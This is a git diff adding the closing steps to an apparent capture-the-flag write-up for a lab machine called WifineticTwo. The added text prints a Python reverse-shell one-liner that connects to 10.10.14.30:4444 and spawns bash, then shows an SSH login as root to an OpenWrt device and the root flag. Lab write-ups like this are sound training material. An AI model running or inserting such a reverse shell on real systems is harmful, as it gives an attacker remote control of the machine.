@@ -103,11 +103,30 @@ Even though we've successfully associated with the WiFi AP, we haven't received 
 
 ![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/wifinetictwo/Screenshot%20(171).png)
 
-Search for instructions on connecting to WiFi using systemd and wpa_supplicant, and also obtaining a gateway using the provided link: [Connecting to WiFi network using systemd and wpa_supplicant](https://wiki.somlabs.com/index.php/Connecting_to_WiFi_network_using_systemd_and_wpa-supplicant).
+Search for instructions on connecting to WiFi using systemd and wpa_supplicant, and also obtaining IP address of the device in the WLAN network “plcrouter” using the provided link: [Connecting to WiFi network using systemd and wpa_supplicant](https://wiki.somlabs.com/index.php/Connecting_to_WiFi_network_using_systemd_and_wpa-supplicant).
 
 ![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/wifinetictwo/Screenshot%20(175).png)
 
 ![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/wifinetictwo/Screenshot%20(176).png)
+
+I then tried establishishing an SSH connection to the device with the IP address 192.168.1.1. The SSH connection to 192.168.1.1 as root fails due to host key verification. Then, a Python command is used to connect to 10.10.14.30:4444 and spawn a bash shell, redirecting input/output to the socket:
+
+`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.30",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`
+
+![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/wifinetictwo/Screenshot%20(177).png)
+
+A listener set up on port 4444, a reverse shell connects to it, and the user logs into an OpenWrt system via SSH.
+
+`ssh root@192.168.1.1`
+
+![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/wifinetictwo/Screenshot%20(178).png)
+
+And there it was, sitting pretty: my root flag! 🎉
+
+![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/wifinetictwo/Screenshot%20(179).png)
+
+
+
 
 
 
